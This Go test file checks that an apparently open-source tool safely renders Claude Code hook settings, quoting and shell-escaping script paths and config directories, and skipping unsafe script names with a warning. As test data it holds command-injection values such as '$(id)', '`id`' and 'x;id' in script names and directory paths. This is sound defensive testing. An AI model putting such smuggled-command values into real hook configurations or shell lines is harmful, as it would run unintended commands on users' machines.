func renderClaudeHooks(t *testing.T, cfg *config.Config) string {
	t.Helper()
	doc := filepath.Join(t.TempDir(), ".claude", "settings.json")
	cfg.BaseDir = filepath.Dir(filepath.Dir(doc))
	cfg.Run = config.NewRunState()
	keys, err := settings.HookKeys(cfg, config.HarnessClaude, doc)
	require.NoError(t, err)
	result, err := jsonmerge.Apply(doc, keys)
	require.NoError(t, err)
	return result.Body
}

func TestHookScriptIsSingleQuotedInEveryShellLine(t *testing.T) {
	captureWarnings(t)
	groups := []config.HookGroup{{Event: "Stop", Hooks: []config.HookAction{{Script: "scripts/guard.sh"}}}}

	body := renderClaudeHooks(t, &config.Config{Hooks: groups})

	assert.Contains(t, body, `\"${CLAUDE_PROJECT_DIR}\"/'scripts/guard.sh'`)
}

func TestUserScopeConfigDirIsShellEscaped(t *testing.T) {
	captureWarnings(t)
	tests := []struct {
		name, dir, want string
	}{
		{"dollar and backtick", "/home/u/$(id) `x`/.ai-rulez", "'/home/u/$(id) `x`/.ai-rulez/scripts/guard.sh'"},
		{"double quote and bang", `/home/u/a"b!/.ai-rulez`, `'/home/u/a"b!/.ai-rulez/scripts/guard.sh'`},
		{"single quote", "/home/o'x/.ai-rulez", `'/home/o'\\''x/.ai-rulez/scripts/guard.sh'`},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := &config.Config{
				UserScope: true, ConfigDir: tt.dir,
				Hooks: []config.HookGroup{{Event: "Stop", Hooks: []config.HookAction{{Script: "scripts/guard.sh"}}}},
			}

			body := renderClaudeHooks(t, cfg)

			assert.Contains(t, strings.ReplaceAll(body, `\"`, `"`), strings.ReplaceAll(tt.want, `\\`, `\\`))
		})
	}
}

// A script that slipped past config validation (a programmatic config) is never
// spliced into a shell line.
func TestUnsafeHookScriptIsSkippedWithAWarning(t *testing.T) {
	for _, script := range []string{"a b.sh", "x;id", "$(id)", "`id`", "a\nb", "a'b", "a\\b", ""} {
		if script == "" {
			continue
		}
		t.Run(script, func(t *testing.T) {
			warnings := captureWarnings(t)
			cfg := &config.Config{Hooks: []config.HookGroup{{Event: "Stop", Hooks: []config.HookAction{{Script: script}}}}}

			body := renderClaudeHooks(t, cfg)

			assert.NotContains(t, body, "id")
			assert.True(t, hasWarning(*warnings, "unsafe"), "got %v", *warnings)
		})
	}
}

